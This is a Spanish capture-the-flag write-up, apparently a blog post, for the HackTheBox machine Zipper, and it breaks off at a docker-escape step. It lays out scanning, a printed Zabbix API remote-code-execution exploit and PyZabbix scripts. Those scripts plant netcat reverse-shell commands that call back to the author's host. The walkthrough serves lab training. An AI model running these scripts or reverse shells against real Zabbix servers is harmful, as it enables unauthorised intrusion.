@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>HTB Writeup: Zipper - xbytemx blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Tony Palma" />
+  <meta name="description" content="Esta máquina fue del tipo: Lee todo lo posible sobre la API, entiende bien lo que hace cada parámetro y ahora si, lánzalo.
+" />
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0" />
+
+
+<link rel="canonical" href="https://xbytemx.github.io/post/htb_writeup_-_zipper/" />
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+<link href="/dist/even.min.css?v=3.2.0" rel="stylesheet">
+<link href="/lib/fancybox/jquery.fancybox-3.1.20.min.css" rel="stylesheet">
+
+
+
+
+<meta property="og:title" content="HTB Writeup: Zipper" />
+<meta property="og:description" content="Esta máquina fue del tipo: Lee todo lo posible sobre la API, entiende bien lo que hace cada parámetro y ahora si, lánzalo." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xbytemx.github.io/post/htb_writeup_-_zipper/" />
+<meta property="article:published_time" content="2019-02-22T18:55:03-06:00"/>
+<meta property="article:modified_time" content="2019-02-22T18:55:03-06:00"/><meta property="og:site_name" content="xbytemx blog" />
+
+<meta itemprop="name" content="HTB Writeup: Zipper">
+<meta itemprop="description" content="Esta máquina fue del tipo: Lee todo lo posible sobre la API, entiende bien lo que hace cada parámetro y ahora si, lánzalo.">
+
+
+<meta itemprop="datePublished" content="2019-02-22T18:55:03-06:00" />
+<meta itemprop="dateModified" content="2019-02-22T18:55:03-06:00" />
+<meta itemprop="wordCount" content="3625">
+
+
+
+<meta itemprop="keywords" content="hackthebox,htb,zabbix,rce,linux," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB Writeup: Zipper"/>
+<meta name="twitter:description" content="Esta máquina fue del tipo: Lee todo lo posible sobre la API, entiende bien lo que hace cada parámetro y ahora si, lánzalo."/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">xbytemx blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">xbytemx blog</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">HTB Writeup: Zipper</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-02-22 </span>
+        <div class="post-category">
+            
+              <a href="/categories/htb/"> htb </a>
+            
+              <a href="/categories/pentesting/"> pentesting </a>
+            
+          </div>
+        <span class="more-meta"> 3625 palabras </span>
+        <span class="more-meta"> 18 mins lectura </span>
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contenidos</h2>
+  
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#machine-info">Machine info</a></li>
+<li><a href="#port-scanning">Port Scanning</a></li>
+<li><a href="#services-identification">Services Identification</a></li>
+<li><a href="#gobuster-dirbusterdiclistsmall">Gobuster + dirbusterDicListSmall</a></li>
+<li><a href="#exploring-and-enumering">Exploring and enumering</a></li>
+<li><a href="#searchsploit">Searchsploit</a></li>
+<li><a href="#zabbix-api-documentation">Zabbix API Documentation</a></li>
+<li><a href="#pyzabbix">PyZabbix</a></li>
+<li><a href="#rce-to-reverse-shell">RCE to reverse shell</a></li>
+<li><a href="#escape-from-docker">Escape from docker?</a></li>
+<li><a href="#from-zabbix-to-root-a-k-a-privesc">from zabbix to root a.k.a. privesc</a></li>
+<li><a href="#cat-root-txt-and-user-txt">cat root.txt and user.txt</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+
+    
+    
+
+    
+    <div class="post-content">
+      <p>Esta máquina fue del tipo: Lee todo lo posible sobre la API, entiende bien lo que hace cada parámetro y ahora si, lánzalo.</p>
+
+<h1 id="machine-info">Machine info</h1>
+
+<p>La información que tenemos de la maquina es:</p>
+
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Maker</th>
+<th>OS</th>
+<th>IP Address</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td><img src="https://www.hackthebox.eu/storage/avatars/47cfc1b3b78883cf955f58c4464e0743_thumb.png" alt="zipper image" /> <a href="https://www.hackthebox.eu/home/machines/profile/159">zipper</a></td>
+<td><a href="https://www.hackthebox.eu/home/users/profile/1453">burmat</a></td>
+<td>Linux</td>
+<td>10.10.10.108</td>
+</tr>
+</tbody>
+</table>
+
+<p>Su tarjeta de presentación es:</p>
+
+<p><img src="/img/htb-zipper/cardinfo.png" alt="cardinfo" /></p>
+
+<h1 id="port-scanning">Port Scanning</h1>
+
+<p>Iniciamos por ejecutar un <code>nmap</code> y un <code>masscan</code> para identificar puertos udp y tcp abiertos:</p>
+
+<pre><code class="language-text">root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.108
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-04 16:27 CST
+Initiating Ping Scan at 16:27
+Scanning 10.10.10.108 [4 ports]
+Completed Ping Scan at 16:27, 0.42s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 16:27
+Scanning 10.10.10.108 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.108
+Discovered open port 22/tcp on 10.10.10.108
+SYN Stealth Scan Timing: About 45.42% done; ETC: 16:29 (0:00:37 remaining)
+Discovered open port 10050/tcp on 10.10.10.108
+Completed SYN Stealth Scan at 16:30, 121.94s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.108
+Host is up (0.19s latency).
+Not shown: 64555 closed ports, 977 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+10050/tcp open  zabbix-agent
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 122.51 seconds
+           Raw packets sent: 166729 (7.336MB) | Rcvd: 143139 (5.726MB)
+</code></pre>
+
+<ul>
+<li><code>-sS</code> para escaneo TCP vía SYN</li>
+<li><code>-p-</code> para todos los puertos TCP</li>
+<li><code>--open</code> para que solo me muestre resultados de puertos abiertos</li>
+<li><code>-n</code> para no ejecutar resoluciones</li>
+<li><code>-v</code> para modo <em>verboso</em></li>
+</ul>
+
+<p>Corroboremos con <code>masscan</code>:</p>
+
+<pre><code class="language-text">root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.108
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-04 22:20:25 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131072 ports/host]
+Discovered open port 80/tcp on 10.10.10.108
+Discovered open port 22/tcp on 10.10.10.108
+Discovered open port 10050/tcp on 10.10.10.108
+</code></pre>
+
+<ul>
+<li><code>-e tun0</code> para ejecutarlo nada mas en la interface tun0</li>
+<li><code>-p0-65535,U:0-65535</code> TODOS los puertos (TCP y UDP)</li>
+<li><code>--rate 500</code> para mandar 500pps y no sobre cargar la VPN ):</li>
+</ul>
+
+<p>Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con <code>nmap</code>.</p>
+
+<h1 id="services-identification">Services Identification</h1>
+
+<p>Lanzamos nmap con los parámetros habituales para la identificación de servicios y versiones:</p>
+
+<pre><code class="language-text">root@laptop:~# nmap -p22,80,10050 -n -sC -sV 10.10.10.108 --script vuln
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-04 16:35 CST
+Nmap scan report for 10.10.10.108
+Host is up (0.19s latency).
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+10050/tcp open  tcpwrapped
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.71 seconds
+</code></pre>
+
+<ul>
+<li><code>-p22,80,10050</code> Ya conocemos a los sospechoso, estos 3 puertos abiertos.</li>
+<li><code>-n</code> Sin resolver, nada con el dns.</li>
+<li><code>-sC</code> Lanza los scripts de descubrimiento por defecto</li>
+<li><code>-sV</code> Realiza la detección de versiones en cada puerto abierto</li>
+<li><code>--script vuln</code> Lanza los scripts de vulnerabilidades</li>
+</ul>
+
+<p>Una rápida googleada, no indicara que el servicio SSH no es vulnerable de acuerdo a la versión anunciada. De igual manera, la versión de apache no es vulnerable directamente a exploits.</p>
+
+<h1 id="gobuster-dirbusterdiclistsmall">Gobuster + dirbusterDicListSmall</h1>
+
+<p>Lanzamos un gobuster para identificar todos los posibles archivos y directorios publicados por el servidor web:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/htb/zipper$ ~/tools/gobuster -u http://10.10.10.108/ -w ~/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.108/
+[+] Threads      : 20
+[+] Wordlist     : /home/xbytemx/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt
+[+] Status codes : 200,204,301,302,307,403,500
+[+] Extensions   : txt,php
+[+] Timeout      : 10s
+=====================================================
+2019/01/04 16:50:01 Starting gobuster
+=====================================================
+/zabbix (Status: 301)
+=====================================================
+2019/01/04 17:20:20 Finished
+=====================================================
+</code></pre>
+
+<ul>
+<li><code>-u http://10.10.10.108/</code> La url a la cual le realizaremos todas esas peticiones</li>
+<li><code>-w ~/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt</code> El diccionario que utilizaremos con las palabras que irán en las peticiones (GET /palabraaqui)</li>
+<li><code>-s '200,204,301,302,307,403,500'</code> El tipo de códigos de respuesta que aceptaremos</li>
+<li><code>-t 20</code> El numero de hilos o peticiones simultaneas que estaremos manejando, <em>ojo</em>, 20 porque mi conexión es lenta.</li>
+<li><code>-x php,txt</code> El tipo de extensiones que buscaremos, es decir, si la palabra es hola, busco el directorio hola, el archivo hola.txt y hola.php</li>
+</ul>
+
+<p>Como resultado encontramos la carpeta zabbix, indicándonos la relación entre <strong>zabbix</strong> y el nombre de la máquina, <strong>zipper</strong>.</p>
+
+<h1 id="exploring-and-enumering">Exploring and enumering</h1>
+
+<p>Abrimos la pagina de <a href="http://10.10.10.108/zabbix/">http://10.10.10.108/zabbix/</a> y tendremos:</p>
+
+<p><img src="/img/htb-zipper/zabbix-www-root.png" alt="Zabbix Home" /></p>
+
+<p>Como no tenemos credenciales, entramos como invitados y llegaremos al menu interno y limitado:</p>
+
+<p><img src="/img/htb-zipper/zabbix-www-dashboard.png" alt="Zabbix Dashboard" /></p>
+
+<p>Tras explorar un poco, veremos que no nos es posible hacer mucho. Pero encontraremos el siguiente mensaje dejado por algún admin:</p>
+
+<p><img src="/img/htb-zipper/zabbix-www-overview.png" alt="Zabbix Overview" /></p>
+
+<p>&ldquo;Zapper&rsquo;s Backup Script - Exit Code&rdquo; sobre <strong>zabbix</strong>, mientras que otros mensajes sobre <strong>zipper</strong></p>
+
+<p>Probamos el usuario zapper para ingresar en el login:</p>
+
+<p><img src="/img/htb-zipper/zabbix-www-zapper-login.png" alt="Zabbix Login of Zapper" /></p>
+
+<p>Parece que para el usuario zapper, el login vía GUI esta deshabilitado.</p>
+
+<h1 id="searchsploit">Searchsploit</h1>
+
+<p>Buscamos en searchsploit vulnerabilidades relacionadas con zabbix:</p>
+
+<pre><code class="language-text">xbytemx@laptop:~/git/exploit-database$ ./searchsploit zabbix
+-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
+ Exploit Title                                                                                                                        |  Path
+                                                                                                                                      | (./)
+-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
+Zabbix - (Authenticated) Remote Command Execution (Metasploit)                                                                        | exploits/linux/remote/29321.rb
+Zabbix 1.1.2 - Multiple Remote Code Execution Vulnerabilities                                                                         | exploits/linux/dos/28775.pl
+Zabbix 1.1.4/1.4.2 - 'daemon_start' Local Privilege Escalation                                                                        | exploits/linux/local/30839.c
+Zabbix 1.1x/1.4.x - File Checksum Request Denial of Service                                                                           | exploits/unix/dos/31403.txt
+Zabbix 1.6.2 Frontend - Multiple Vulnerabilities                                                                                      | exploits/php/webapps/8140.txt
+Zabbix 1.8.1 - SQL Injection                                                                                                          | exploits/php/webapps/12435.txt
+Zabbix 1.8.4 - 'popup.php' SQL Injection                                                                                              | exploits/php/webapps/18155.txt
+Zabbix 2.0 &lt; 3.0.3 - SQL Injection                                                                                                    | exploits/php/webapps/40353.py
+Zabbix 2.0.1 - Session Extractor                                                                                                      | exploits/php/webapps/20087.py
+Zabbix 2.0.5 - Cleartext ldap_bind_Password Password Disclosure (Metasploit)                                                          | exploits/php/webapps/36157.rb
+Zabbix 2.0.8 - SQL Injection / Remote Code Execution (Metasploit)                                                                     | exploits/unix/webapps/28972.rb
+Zabbix 2.2 &lt; 3.0.3 - API JSON-RPC Remote Code Execution                                                                               | exploits/php/webapps/39937.py
+Zabbix 2.2.x/3.0.x - SQL Injection                                                                                                    | exploits/php/webapps/40237.txt
+Zabbix Agent - 'net.tcp.listen' Command Injection (Metasploit)                                                                        | exploits/freebsd/remote/16918.rb
+Zabbix Agent 3.0.1 - 'mysql.size' Shell Command Injection                                                                             | exploits/linux/local/39769.txt
+Zabbix Agent &lt; 1.6.7 - Remote Bypass                                                                                                  | exploits/multiple/webapps/10431.txt
+Zabbix Server - Arbitrary Command Execution (Metasploit)                                                                              | exploits/linux/remote/20796.rb
+Zabbix Server - Multiple Vulnerabilities                                                                                              | exploits/multiple/webapps/10432.txt
+-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
+</code></pre>
+
+<p>Como podemos ver, existen bastantes vulnerabilidades asociadas a las diferentes versiones de zabbix, pero en este momento aun no sabemos que versión de zabbix tenemos. Eso lo resolvemos al entrar como guest y buscar los manuales de ayuda, los cuales hacen referencia a la versión 3.0, por lo que partimos de tener la versión 3.</p>
+
+<p>En mi caso, elegí el exploit de <code>Zabbix 2.2 &lt; 3.0.3 - API JSON-RPC Remote Code Execution</code>, el cual tiene el siguiente código:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+# Exploit Title: Zabbix RCE with API JSON-RPC
+# Date: 06-06-2016
+# Exploit Author: Alexander Gurin
+# Vendor Homepage: http://www.zabbix.com
+# Software Link: http://www.zabbix.com/download.php
+# Version: 2.2 - 3.0.3
+# Tested on: Linux (Debian, CentOS)
+# CVE : N/A
+
+import requests
+import json
+import readline
+
+ZABIX_ROOT = 'http://192.168.66.2'	### Zabbix IP-address
+url = ZABIX_ROOT + '/api_jsonrpc.php'	### Don't edit
+
+login = 'Admin'		### Zabbix login
+password = 'zabbix'	### Zabbix password
+hostid = '10084'	### Zabbix hostid
+
+### auth
+payload = {
+   	&quot;jsonrpc&quot; : &quot;2.0&quot;,
+    &quot;method&quot; : &quot;user.login&quot;,
+    &quot;params&quot;: {
+    	'user': &quot;&quot;+login+&quot;&quot;,
+    	'password': &quot;&quot;+password+&quot;&quot;,
+    },
+   	&quot;auth&quot; : None,
+    &quot;id&quot; : 0,
+}
+headers = {
+    'content-type': 'application/json',
+}
+
+auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
+auth = auth.json()
+
+while True:
+	cmd = raw_input('\033[41m[zabbix_cmd]&gt;&gt;: \033[0m ')
+	if cmd == &quot;&quot; : print &quot;Result of last command:&quot;
+	if cmd == &quot;quit&quot; : break
+
+### update
+	payload = {
+		&quot;jsonrpc&quot;: &quot;2.0&quot;,
+		&quot;method&quot;: &quot;script.update&quot;,
+		&quot;params&quot;: {
+		    &quot;scriptid&quot;: &quot;1&quot;,
+		    &quot;command&quot;: &quot;&quot;+cmd+&quot;&quot;
+		},
+		&quot;auth&quot; : auth['result'],
+		&quot;id&quot; : 0,
+	}
+
+	cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))
+
+### execute
+	payload = {
+		&quot;jsonrpc&quot;: &quot;2.0&quot;,
+		&quot;method&quot;: &quot;script.execute&quot;,
+		&quot;params&quot;: {
+		    &quot;scriptid&quot;: &quot;1&quot;,
+		    &quot;hostid&quot;: &quot;&quot;+hostid+&quot;&quot;
+		},
+		&quot;auth&quot; : auth['result'],
+		&quot;id&quot; : 0,
+	}
+
+	cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
+	cmd_exe = cmd_exe.json()
+	print cmd_exe[&quot;result&quot;][&quot;value&quot;]
+</code></pre>
+
+<p>Nos pide 4 parámetros: IP, usuario, contraseña y hostid. Conocemos casi todos, menos <strong>hostid</strong>.</p>
+
+<p>Vemos que un primer bloque del código se encarga de realizar la autenticación con la API de Zabbix, posterior entra a un ciclo While infinito en donde declara un prompt <em>cmd</em> y recibe la entrada del teclado. Si cmd no recibe nada, muestra en pantalla un mensaje, si recibe el string &ldquo;quit&rdquo; hace break del ciclo infinito.</p>
+
+<p>Tenemos la siguiente sección es update, en donde prepara un payload donde el método es <strong>script.update</strong> con parámetros <strong>scriptid</strong> y <strong>command</strong> con nuestro comando.</p>
+
+<p>La ultima sección, execute, llama al método <strong>script.execute</strong> y recibe de parámetros a <strong>scriptid</strong> y <strong>hostid</strong>. El resultado o response de ese request, lo imprime en pantalla.</p>
+
+<p>Ahora necesitamos saber que hace cada función y que valores son validos en cada parámetro por lo que vamos a &hellip;</p>
+
+<h1 id="zabbix-api-documentation">Zabbix API Documentation</h1>
+
+<p>La <a href="https://www.zabbix.com/documentation/3.0/manual/api">documentación de la API</a> nos explica rápidamente algunos conceptos clave:</p>
+
+<ul>
+<li>Tenemos que autenticarnos y usar el token asignado durante su vigencia</li>
+<li>Tenemos 4 métodos principales para todos los tipos de objeto (get, create, update y delete)</li>
+<li>La documentación sobre el objeto script la encontramos <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/script/object">aquí</a></li>
+</ul>
+
+<p>Ahí podemos entender un poco mas sobre el tipo de objeto script, que requiere de un nombre y un comando para poderse crear.</p>
+
+<p>Sobre los métodos encontramos mas información en el <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/script">manual de referencia</a> el cual nos explica sobre el método <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/script/update">script.update</a> y <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/script/execute">script.execute</a></p>
+
+<p><code>script.update</code>, se encarga de actualizar los valores del objeto script y su único argumento mínimo es <code>scriptid</code>, seguido del nombre/valor a editar.
+<code>script.execute</code>, se encarga de ejecutar el <code>scriptid</code> sobre el <code>hostid</code> seleccionado. Ambos parámetros son obligatorios.</p>
+
+<p>Tras leer esto, llegue a la conclusión de no saber cuales eran mis hostid&rsquo;s y scriptid&rsquo;s en la maquina, por lo que nuevamente leyendo el manual de la API, encontré como conocerlo con <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/script/get">script.get</a> y <a href="https://www.zabbix.com/documentation/3.0/manual/api/reference/host/get">host.get</a>.</p>
+
+<p>Ambos no requieren parámetros por lo que decidí realizar mi modificación al script original y utilizando en su lugar la API implementada en python3.</p>
+
+<h1 id="pyzabbix">PyZabbix</h1>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+from pyzabbix import ZabbixAPI
+
+api_address=&quot;http://10.10.10.108/zabbix/api_jsonrpc.php&quot;
+
+user=&quot;zapper&quot;
+password=&quot;zapper&quot;
+
+zapi = ZabbixAPI(api_address)
+zapi.login(user, password)
+
+for host in zapi.host.get():
+    print(&quot;host name: {}, host id: {}&quot;.format(host['host'],host['hostid']))
+    print(zapi.script.get(filter={&quot;host&quot;: host['host']}))
+</code></pre>
+
+<p>El siguiente comando simplemente devuelve todos los hosts, y cada script en cada host. Su salida de ejemplo es la siguiente:</p>
+
+<pre><code class="language-text">host name: Zabbix, host id: 10105
+[{'scriptid': '1', 'name': 'Ping', 'command': 'nc 10.10.13.18 4444 -e /bin/bash', 'host_access': '2', 'usrgrpid': '0', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}, {'scriptid': '2', 'name': 'Traceroute', 'command': '/usr/bin/traceroute {HOST.CONN} 2&gt;&amp;1', 'host_access': '2', 'usrgrpid': '0', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}, {'scriptid': '3', 'name': 'Detect operating system', 'command': 'sudo /usr/bin/nmap -O {HOST.CONN} 2&gt;&amp;1', 'host_access': '2', 'usrgrpid': '7', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}]
+host name: Zipper, host id: 10106
+[{'scriptid': '1', 'name': 'Ping', 'command': 'nc 10.10.13.18 4444 -e /bin/bash', 'host_access': '2', 'usrgrpid': '0', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}, {'scriptid': '2', 'name': 'Traceroute', 'command': '/usr/bin/traceroute {HOST.CONN} 2&gt;&amp;1', 'host_access': '2', 'usrgrpid': '0', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}, {'scriptid': '3', 'name': 'Detect operating system', 'command': 'sudo /usr/bin/nmap -O {HOST.CONN} 2&gt;&amp;1', 'host_access': '2', 'usrgrpid': '7', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}]
+</code></pre>
+
+<p>Como podemos ver tenemos dos Hosts, Zipper y Zabbix. Esto es importante, porque dependiendo del Host ID, sera donde se ejecute nuestro script.</p>
+
+<h1 id="rce-to-reverse-shell">RCE to reverse shell</h1>
+
+<p>Ahora que sabemos un poco mas sobre el funcionamiento de la API y conocemos más de sus parámetros, podemos crear nuestro primer script en Zipper:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+from pyzabbix import ZabbixAPI
+
+api_address=&quot;http://10.10.10.108/zabbix/api_jsonrpc.php&quot;
+
+user=&quot;zapper&quot;
+password=&quot;zapper&quot;
+hostname = &quot;Zipper&quot;
+hostid = &quot;10106&quot;
+
+zapi = ZabbixAPI(api_address)
+zapi.login(user, password)
+
+scriptid = &quot;&quot;
+
+
+get_scripts = zapi.script.get(filter={&quot;host&quot;: hostname})
+for script in get_scripts:
+    if script['name'] == &quot;miau script&quot;:
+        scriptid = script['scriptid']
+
+if scriptid == &quot;&quot;:
+    scriptid = zapi.script.create(name='miau script', command='id')['scriptids']
+
+print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
+</code></pre>
+
+<p>Como salida tendremos lo siguiente:</p>
+
+<pre><code class="language-text">{'response': 'success', 'value': 'uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)\n'}
+</code></pre>
+
+<p>Ahora, usando una de las viejas conocidas para reverse shell, cargaremos el siguiente comando para hacer una reverse shell de netcat:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+from pyzabbix import ZabbixAPI
+
+api_address=&quot;http://10.10.10.108/zabbix/api_jsonrpc.php&quot;
+
+user=&quot;zapper&quot;
+password=&quot;zapper&quot;
+hostname = &quot;Zipper&quot;
+hostid = &quot;10106&quot;
+
+zapi = ZabbixAPI(api_address)
+zapi.login(user, password)
+
+scriptid = &quot;&quot;
+
+revshell = &quot;nc -e /bin/bash 10.10.12.83 3001&quot;
+
+get_scripts = zapi.script.get(filter={&quot;host&quot;: hostname})
+for script in get_scripts:
+    if script['name'] == &quot;miau script&quot;:
+        scriptid = script['scriptid']
+        zapi.script.update(scriptid=scriptid, command=revshell)
+
+if scriptid == &quot;&quot;:
+    scriptid = zapi.script.create(name='miau script', command=revshell)['scriptids']
+
+print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
+</code></pre>
+
+<p>Bastaría con iniciar un netcat para esperar la conexión:</p>
+
+<pre><code class="language-text">Shell1:
+xbytemx@laptop:~$ ncat -klvnp 3001
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::3001
+Ncat: Listening on 0.0.0.0:3001
+
+Shell2:
+xbytemx@laptop:~$ python3 get_revsh.py
+
+Shell1:
+Ncat: Connection from 10.10.10.108.
+Ncat: Connection from 10.10.10.108:46448.
+id
+uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)
+ls -lah /
+total 84K
+drwxr-xr-x   1 root root 4.0K Jan 22 23:22 .
+drwxr-xr-x   1 root root 4.0K Jan 22 23:22 ..
+-rwxr-xr-x   1 root root    0 Jan 22 23:22 .dockerenv
+drwxrwxrwx   2 1000 1000 4.0K Jan 22 23:34 backups
+drwxr-xr-x   1 root root 4.0K Sep  8 07:21 bin
+drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
+drwxr-xr-x   5 root root  360 Jan 22 23:22 dev
+drwxr-xr-x   1 root root 4.0K Jan 22 23:22 etc
+drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
+drwxr-xr-x   1 root root 4.0K Aug 21  2018 lib
+drwxr-xr-x   2 root root 4.0K Aug 21  2018 media
+drwxr-xr-x   2 root root 4.0K Aug 21  2018 mnt
+drwxr-xr-x   2 root root 4.0K Aug 21  2018 opt
+dr-xr-xr-x 139 root root    0 Jan  9 23:22 proc
+drwx------   1 root root 4.0K Sep  8 07:33 root
+drwxr-xr-x   1 root root 4.0K Sep  8 07:39 run
+drwxr-xr-x   1 root root 4.0K Sep  8 07:19 sbin
+drwxr-xr-x   2 root root 4.0K Aug 21  2018 srv
+dr-xr-xr-x  13 root root    0 Jan  9 23:33 sys
+drwxrwxrwt   1 root root 4.0K Jan  9 23:22 tmp
+drwxr-xr-x   1 root root 4.0K Aug 21  2018 usr
+drwxr-xr-x   1 root root 4.0K Sep  8 07:21 var
+</code></pre>
+
+<p>Oh, creo que estoy dentro de una instancia de docker.</p>
+
+<h1 id="escape-from-docker">Escape from docker?</h1>
+
+<p>Estuve enumerando y enumerando la instancia de docker, hasta que me di cuenta de un detalle importantísimo de la configuración. El objeto script, tiene una propiedad especial llamada <code>execute_on</code>, la cual te permite ejecutar el script ya sea dentro del servidor de zabbix (docker) o sobre el cliente (el que tiene abierto el puerto 10050!), por lo que modificando las lineas 22 y 25 el script se ejecutará en el agente:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+from pyzabbix import ZabbixAPI
+
+api_address=&quot;http://10.10.10.108/zabbix/api_jsonrpc.php&quot;
+
+user=&quot;zapper&quot;
+password=&quot;zapper&quot;
+hostname = &quot;Zipper&quot;
+hostid = &quot;10106&quot;
+
+zapi = ZabbixAPI(api_address)
+zapi.login(user, password)
+
+scriptid = &quot;&quot;
+
+revshell = &quot;nc -e /bin/bash 10.10.12.83 3001&quot;
+
+get_scripts = zapi.script.get(filter={&quot;host&quot;: hostname})
+for script in get_scripts:
+    if script['name'] == &quot;miau script&quot;:
+        scriptid = script['scriptid']
+        zapi.script.update(scriptid=scriptid, execute_on=&quot;0&quot;, command=revshell)
+
+if scriptid == &quot;&quot;:
+    scriptid = zapi.script.create(name='miau script', execute_on=&quot;0&quot;, command=revshell)['scriptids']
+
